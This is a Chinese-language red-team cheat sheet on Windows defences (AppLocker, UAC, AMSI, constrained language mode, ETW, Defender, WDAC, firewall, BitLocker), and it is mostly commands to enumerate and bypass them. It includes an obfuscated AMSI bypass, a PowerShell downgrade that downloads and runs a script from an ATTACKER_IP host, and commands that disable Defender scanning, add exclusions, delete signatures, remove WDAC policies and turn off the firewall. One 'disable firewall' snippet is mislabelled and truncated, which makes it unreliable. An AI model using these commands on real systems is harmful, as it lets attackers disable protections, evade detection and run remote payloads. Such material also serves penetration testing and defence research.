# Windows - 防御措施

## 摘要

* [AppLocker](#applocker)
* [用户账户控制](#user-account-control)
* [DPAPI](#dpapi)
* [PowerShell](#powershell)
  * [反恶意软件扫描接口](#anti-malware-scan-interface)
  * [Just Enough Administration](#just-enough-administration)
  * [受限制的语言模式](#constrained-language-mode)
  * [脚本块日志记录](#script-block-logging)
* [受保护的过程轻量级](#protected-process-light)
* [凭据防护](#credential-guard)
* [Windows事件跟踪](#event-tracing-for-windows)
* [Windows Defender防病毒](#windows-defender-antivirus)
* [Windows Defender应用程序控制](#windows-defender-application-control)
* [Windows Defender防火墙](#windows-defender-firewall)
* [Windows信息保护](#windows-information-protection)

## AppLocker

> AppLocker是Microsoft Windows中的一个安全功能，它允许管理员控制用户可以在其系统上运行哪些应用程序和文件。规则可以基于各种标准，如文件路径、文件发布者或文件哈希，并且可以应用于特定用户或组。

* 枚举本地AppLocker有效策略

  ```powershell
  PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  PowerView PS C:\> Get-AppLockerPolicy -effective -xml
  Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe # (键: Appx, Dll, Exe, Msi 和 Script)
  ```

* AppLocker绕过

  * 默认情况下，`C:\Windows`没有被阻止，`C:\Windows\Tasks`可以被任何用户写入
  * [api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
  * [api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
  * [api0cradle/UltimateAppLockerByPassList/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)

## 用户账户控制

UAC代表用户账户控制。这是微软在Windows Vista中引入的安全功能，并存在于所有后续版本的Windows操作系统中。UAC有助于减轻恶意软件的影响，并通过在允许对系统进行可能影响到计算机所有用户的更改之前请求许可或管理员密码来帮助保护用户。

* 检查UAC是否启用

  ```ps1
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
  ```

* 检查UAC级别

  ```
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
  ```

| EnableLUA | LocalAccountTokenFilterPolicy | FilterAdministratorToken | 描述            |
| --------- | ----------------------------- | ------------------------ | --------------- |
| 0         | /                             | /                        | 无UAC           |
| 1         | 1                             | /                        | 无UAC           |
| 1         | 0                             | 0                        | RID 500无UAC    |
| 1         | 0                             | 1                        | 为每个人启用UAC |

* UAC绕过
  * [微软签名的自动提升二进制文件](https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html) - `msconfig`、`sdclt.exe`、`eventvwr.exe`等
  * [hfiref0x/UACME](https://github.com/hfiref0x/UACME) - 击败Windows用户账户控制

## DPAPI

参考 [PayloadsAllTheThings/Windows - DPAPI.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md)

## PowerShell

### 反恶意软件扫描接口

> 反恶意软件扫描接口（AMSI）是一个Windows API（应用程序编程接口），为应用程序和服务提供了一个统一的接口，以便与系统上安装的任何反恶意软件产品集成。该API允许反恶意软件解决方案在运行时扫描文件和脚本，并为应用程序提供了请求扫描特定内容的方法。

查找更多AMSI绕过方法：[Windows - AMSI Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### 足够的管理

> 足够的管理（JEA）是 Microsoft Windows Server 中的一项功能，允许管理员将特定的管理任务委托给非管理员用户。JEA 提供了一种安全且可控的方式来授予系统有限的、刚刚足够的访问权限，同时确保用户不能执行意外的操作或访问敏感信息。

JEA 的使用：

* 列出可用的 cmdlet：`command`

* 寻找非默认的 cmdlet：

  ```ps1
  Set-PSSessionConfiguration
  Start-Process
  New-Service
  Add-Computer
  ```

### 受限语言模式

检查我们是否处于受限模式：`$ExecutionContext.SessionState.LanguageMode`

* 使用旧版 Powershell 进行绕过。Powershell v2 不支持 CLM。

  ```ps1
  powershell.exe -version 2
  powershell.exe -version 2 -ExecutionPolicy bypass
  powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
  ```

* 当使用 `__PSLockDownPolicy` 时进行绕过。只需在路径中的某处放置 "System32"。

  ```ps1
  # 从环境变量中启用 CLM
  [Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
  Get-ChildItem -Path Env:
  
  # 创建一个包含你的 "恶意" powershell 命令的 check-mode.ps1
  $mode = $ExecutionContext.SessionState.LanguageMode
  write-host $mode
  
  # 简单的绕过，在 System32 文件夹内执行
  PS C:\> C:\Users\Public\check-mode.ps1
  ConstrainedLanguage
  
  PS C:\> C:\Users\Public\System32\check-mode.ps1
  FullLanguagge
  ```

* 使用 COM 进行绕过：[xpn/COM_to_registry.ps1](https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1)

* 使用你自己的 Powershell DLL 进行绕过：[p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll) & [iomoath/PowerShx](https://github.com/iomoath/PowerShx)

  ```ps1
  rundll32 PowerShdll,main <script>
  rundll32 PowerShdll,main -h      显示此消息
  rundll32 PowerShdll,main -f <path>       运行作为参数传递的脚本
  rundll32 PowerShdll,main -w      在新窗口中启动交互式控制台（默认）
  rundll32 PowerShdll,main -i      在此控制台中启动交互式控制台
  
  rundll32 PowerShx.dll,main -e                           <要运行的 PS 脚本>
  rundll32 PowerShx.dll,main -f <path>                    运行作为参数传递的脚本
  rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     加载脚本并运行 PS cmdlet
  rundll32 PowerShx.dll,main -w                           在新窗口中启动交互式控制台
  rundll32 PowerShx.dll,main -i                           启动交互式控制台
  rundll32 PowerShx.dll,main -s                           尝试绕过 AMSI
  rundll32 PowerShx.dll,main -v                           将执行输出打印到控制台
  ```

### 脚本块日志记录

> 一旦启用了脚本块日志记录，执行的脚本块和命令将被记录在 Windows 事件日志的“Windows PowerShell”通道下。要查看日志，管理员可以使用事件查看器应用程序并导航到“Windows PowerShell”通道。

启用脚本块日志记录：

```ps1
function Enable-PSScriptBlockLogging
{
    $basePath = 'HKLM:\Software\Policies\Microsoft\Windows' +
      '\PowerShell\ScriptBlockLogging'

    if(-not (Test-Path $basePath))
    {
        $null = New-Item $basePath -Force
    }

    Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
}
```

## 受保护进程轻量级

受保护进程轻量级（PPL）作为 Windows 安全机制实施，使进程能够被标记为“受保护”并在安全的隔离环境中运行，从而免受恶意软件或其他未经授权进程的攻击。PPL 用于保护对操作系统操作至关重要的进程，如防病毒软件、防火墙和其他安全相关进程。

当进程被标记为使用 PPL 的“受保护”时，它会被分配一个安全级别，该级别决定了它将接收的保护级别。这个安全级别可以设置为从低到高的几个级别之一。被分配较高安全级别的进程比分配较低安全级别的进程获得更多的保护。

进程的保护是由“级别”和“签名者”的组合定义的。下表代表了常用的组合，来自 [itm4n.github.io](https://itm4n.github.io/lsass-runasppl/)。

| 保护级别                        | 值   | 签名者           | 类型           |
| ------------------------------- | ---- | ---------------- | -------------- |
| PS_PROTECTED_SYSTEM             | 0x72 | WinSystem (7)    | 受保护 (2)     |
| PS_PROTECTED_WINTCB             | 0x62 | WinTcb (6)       | 受保护 (2)     |
| PS_PROTECTED_WINDOWS            | 0x52 | Windows (5)      | 受保护 (2)     |
| PS_PROTECTED_AUTHENTICODE       | 0x12 | Authenticode (1) | 受保护 (2)     |
| PS_PROTECTED_WINTCB_LIGHT       | 0x61 | WinTcb (6)       | 轻量级保护 (1) |
| PS_PROTECTED_WINDOWS_LIGHT      | 0x51 | Windows (5)      | 轻量级保护 (1) |
| PS_PROTECTED_LSA_LIGHT          | 0x41 | Lsa (4)          | 轻量级保护 (1) |
| PS_PROTECTED_ANTIMALWARE_LIGHT  | 0x31 | Antimalware (3)  | 轻量级保护 (1) |
| PS_PROTECTED_AUTHENTICODE_LIGHT | 0x11 | Authenticode (1) | 轻量级保护 (1) |

PPL 通过限制对受保护进程内存和系统资源的访问，并防止进程被其他进程或用户修改或终止来工作。该进程还与系统上运行的其他进程隔离，这有助于防止试图利用共享资源或依赖项的攻击。


* 检查LSASS是否在PPL中运行

  ```ps1
  reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
  ```

* 受保护进程示例：即使具有管理员权限，也无法终止Microsoft Defender。

  ```ps1
  taskkill /f /im MsMpEng.exe
  错误：无法终止PID为5784的进程“MsMpEng.exe”。
  原因：访问被拒绝。
  ```

* 可以使用易受攻击的驱动程序（自带易受攻击驱动程序/BYOVD）禁用


## 凭据防护

启用凭据防护时，它使用基于硬件的虚拟化创建一个与操作系统分离的安全环境。这个安全环境用于存储敏感的凭据信息，这些信息被加密并防止未经授权的访问。

凭据防护结合使用基于硬件的虚拟化和可信平台模块（TPM），以确保安全内核是受信任且安全的。它可以在具有兼容处理器和TPM版本的设备上启用，并要求UEFI固件支持必要的功能。


## Windows事件跟踪

ETW（Windows事件跟踪）是一种基于Windows的日志记录机制，提供了一种实时收集和分析系统事件和性能数据的方法。ETW允许开发人员和系统管理员收集有关系统性能和行为的详细信息，这些信息可用于故障排除、优化和安全目的。

| 名称                                  | GUID                                   |
| ------------------------------------- | -------------------------------------- |
| Microsoft-Antimalware-Scan-Interface  | {2A576B87-09A7-520E-C21A-4942F0271D67} |
| Microsoft-Windows-PowerShell          | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |
| Microsoft-Antimalware-Protection      | {E4B70372-261F-4C54-8FA6-A5A7914D73DA} |
| Microsoft-Windows-Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |

您可以使用以下命令查看注册到Windows的所有提供程序：`logman query providers`

```ps1
PS C:\Users\User\Documents> logman query providers

Provider                                 GUID
-------------------------------------------------------------------------------
.NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}
Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}
Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}
Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}
ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}
ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}
...
```

我们可以使用以下命令获取有关提供程序的更多信息：`logman query providers {ProviderID}/Provider-Name`

```ps1
PS C:\Users\User\Documents> logman query providers Microsoft-Antimalware-Scan-Interface

Provider                                 GUID
-------------------------------------------------------------------------------
Microsoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}

Value               Keyword              Description
-------------------------------------------------------------------------------
0x0000000000000001  Event1
0x8000000000000000  AMSI/Debug

Value               Level                Description
-------------------------------------------------------------------------------
0x04                win:Informational    信息

PID                 Image
-------------------------------------------------------------------------------
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00002084          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x00001bd4
0x00000ad0
0x00000b98
```

`Microsoft-Windows-Threat-Intelligence`提供程序对应于ETWTI，这是一种额外的安全功能，EDR可以订阅并识别API的恶意使用（例如进程注入）。

```ps1
0x0000000000000001  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL
0x0000000000000002  KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER
0x0000000000000004  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE
0x0000000000000008  KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER
0x0000000000000010  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL
0x0000000000000020  KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER
0x0000000000000040  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE
0x0000000000000080  KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER
0x0000000000000100  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL
0x0000000000000200  KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER
0x0000000000000400  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE
0x0000000000000800  KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER
0x0000000000001000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE
0x0000000000002000  KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER
0x0000000000004000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE
0x0000000000008000  KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER
0x0000000000010000  KERNEL_THREATINT_KEYWORD_READVM_LOCAL
0x0000000000020000  KERNEL_THREATINT_KEYWORD_READVM_REMOTE
0x0000000000040000  KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL
0x0000000000080000  KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE
0x0000000000100000  KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD
0x0000000000200000  KERNEL_THREATINT_KEYWORD_RESUME_THREAD
0x0000000000400000  KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS
0x0000000000800000  KERNEL_THREATINT_KEYWORD_RESUME_PROCESS
```

最常见的绕过技术是修补调用`EtwEventWrite`函数，该函数用于写入/记录ETW事件。您可以使用`logman query providers -pid <PID>`列出为进程注册的提供程序。

## Windows Defender防病毒软件

也称为`Microsoft Defender`。

```powershell
# 检查Defender的状态
PS C:\> Get-MpComputerStatus

# 禁用扫描所有下载的文件和附件，禁用AMSI（反应性）
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# 禁用AMSI（设置为0以启用）
PS C:\> Set-MpPreference -DisableScriptScanning 1

# 排除一个文件夹
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# 使用wmi排除
PS C:\> WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public\wmic"

# 删除签名（如果有互联网连接，它们将被再次下载）：
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Windows Defender应用程序控制

也称为`WDAC/UMCI/设备防护`。

> Windows Defender Application Guard（以前称为Device Guard）具有控制应用程序是否可以在Windows设备上执行的能力。WDAC将阻止执行、运行和加载不需要或恶意的代码、驱动程序和脚本。WDAC不信任它不知道的任何软件。

* 获取WDAC当前模式

  ```ps1
  $ Get-ComputerInfo
  DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
  DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode
  ```

* 使用CiTool.exe删除WDAC策略（Windows 11 2022更新）

  ```ps1
  $ CiTool.exe -rp "{PolicyId GUID}" -json
  ```

* 设备防护策略位置：`C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`

* 设备防护示例策略：`C:\Windows\System32\CodeIntegrity\ExamplePolicies\`

* WDAC实用工具：[mattifestation/WDACTools](https://github.com/mattifestation/WDACTools)，一个PowerShell模块，便于构建、配置、部署和审核Windows Defender应用程序控制（WDAC）策略

* WDAC绕过技术：[bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)

  * [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - 使用AddInProcess.exe绕过WDAC

## Windows Defender 防火墙

* 列出防火墙状态和当前配置

  ```powershell
  netsh advfirewall firewall dump
  # 或
  netsh firewall show state
  netsh firewall show config
  ```

* 列出防火墙阻止的端口

  ```powershell
  $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
  ```

* 禁用防火墙

  ```powershell
  # 通过 cmd 禁用防火墙
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  
  # 通过 Powershell 禁用防火墙
  powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
  
  # 使用本地命令在任何 Windows 上禁用防火墙
  netsh firewall set opmode disable
  netsh Advfirewall set allprofiles state off
  ```

## Windows 信息保护

Windows 信息保护（WIP），以前称为企业数据保护（EDP），是 Windows 10 中的一项安全功能，旨在帮助企业设备上的敏感数据。WIP 通过允许管理员定义控制企业数据访问、共享和保护的策略，帮助防止意外数据泄露。WIP 的工作原理是识别并将设备上的企业数据与个人数据分开。

通过加密文件系统（EFS）加密 Windows（NTFS 文件系统的功能）来促进对本地标记为企业文件的文件（数据）的保护。

* 枚举文件属性，`Encrypted` 属性用于受 WIP 保护的文件

  ```ps1
  PS C:\> (Get-Item -Path 'C:\...').attributes
  Archive, Encrypted
  ```

* 加密文件：`cipher /c encryptedfile.extension`

* 解密文件：`cipher /d encryptedfile.extension`

**企业上下文** 列显示每个应用程序可以对企业数据执行的操作：

* **域**。显示员工的工作域（例如，corp.contoso.com）。此应用程序被视为与工作相关，可以自由访问和打开工作数据和资源。
* **个人**。显示文本“个人”。此应用程序被视为与工作无关，不能接触任何工作数据或资源。
* **豁免**。显示文本“豁免”。Windows 信息保护策略不适用于这些应用程序（如系统组件）。

## BitLocker 驱动器加密

BitLocker 是自 Windows Vista 起包含在 Microsoft Windows 操作系统中的全磁盘加密功能。它旨在通过为整个卷提供加密来保护数据。BitLocker 使用 AES 加密算法对磁盘上的数据进行加密。启用后，BitLocker 要求用户在操作系统加载之前输入密码或插入 USB 闪存驱动器以解锁加密卷，确保磁盘上的数据免受未经授权的访问。BitLocker 通常用于笔记本电脑、便携式存储设备和其他移动设备，以防止在失窃或丢失的情况下敏感数据受到保护。

当 BitLocker 处于 `Suspended` 状态时，使用 Windows 安装 USB 启动系统，然后使用此命令解密驱动器：`manage-bde -off c:`

您可以使用此命令检查是否完成解密：`manage-bde -status`

## 参考

1. **悄悄绕过设备防护 - Cybereason - Philip Tsukerman**
   这篇文章可能讨论了如何绕过Windows设备防护机制的方法和策略，由Cybereason的Philip Tsukerman撰写。请参阅[原文](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)以获取更多信息。

2. **PowerShell关于Windows日志记录 - 微软文档**
   这篇微软文档介绍了PowerShell中关于Windows日志记录的功能和配置方法。您可以在此[链接](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)查阅详细内容。

3. **你真的了解LSA保护（RunAsPPL）吗？ - itm4n - 2021年4月7日**
   itm4n撰写的这篇文章深入探讨了Windows中的LSA（本地安全认证子系统服务）保护，特别是RunAsPPL的相关知识。请访问[原文](https://itm4n.github.io/lsass-runasppl/)以获取更多信息。

4. **确定在Windows信息保护（WIP）中运行应用程序的企业上下文 - 微软 - 2023年3月10日**
   这篇微软文档解释了如何确定在Windows信息保护（WIP）策略下运行的应用程序的企业上下文。您可以在此[链接](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)阅读更多内容。

5. **创建并验证加密文件系统（EFS）数据恢复代理（DRA）证书 - 微软 - 2022年12月9日**
   这篇文档指导了用户如何创建并验证用于加密文件系统（EFS）的数据恢复代理（DRA）证书。请参阅[原文](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)以获取详细步骤。

6. **通过进程挂起禁用防病毒软件 - Christopher Paschen - 2023年3月24日**
   Christopher Paschen撰写的这篇文章讨论了通过挂起进程来暂时禁用防病毒软件的技术。请访问[原文](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)了解更多信息。

7. **禁用Windows事件跟踪 - UNPROTECT项目 - 2022年4月19日星期二**
   这篇文章来自UNPROTECT项目，介绍了如何禁用Windows的事件跟踪功能。您可以在此[链接](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)找到相关内容。

8. **ETW：Windows事件跟踪入门 - ired.team**
   ired.team提供的这篇文章是有关Windows事件跟踪（ETW）的基础教程。请参阅[原文](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)以获取更多信息。

9. **删除Windows Defender应用程序控制（WDAC）策略 - 微软 - 2022年12月9日**
   这篇微软文档说明了如何删除或禁用Windows Defender应用程序控制（WDAC）策略。您可以在此[链接](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)阅读更多内容。